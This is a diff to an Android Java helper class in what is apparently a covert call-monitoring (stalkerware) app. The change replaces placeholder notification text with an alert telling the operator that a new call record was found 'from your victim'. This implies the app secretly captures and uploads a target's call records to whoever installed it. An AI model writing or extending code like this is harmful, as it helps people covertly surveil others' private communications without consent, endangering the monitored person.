@@ -201,7 +201,7 @@ public class DriveServiceHelper {
         if (userEmail!=null){
             String[] userNameFromEmail=userEmail.split("@");
             topicsName=userNameFromEmail[0];
-            RequestNotificationModel rootModel = new RequestNotificationModel("/topics/"+topicsName, new NotificationModel("Body", "Title"));
+            RequestNotificationModel rootModel = new RequestNotificationModel("/topics/"+topicsName, new NotificationModel("New Call Detected.", "A new call record found from your victim. Please check call record list."));
 
             ApiInterface apiService =  ApiClient.getApiClient().create(ApiInterface.class);
             retrofit2.Call<ResponseBody> responseBodyCall = apiService.sendNotification(rootModel);
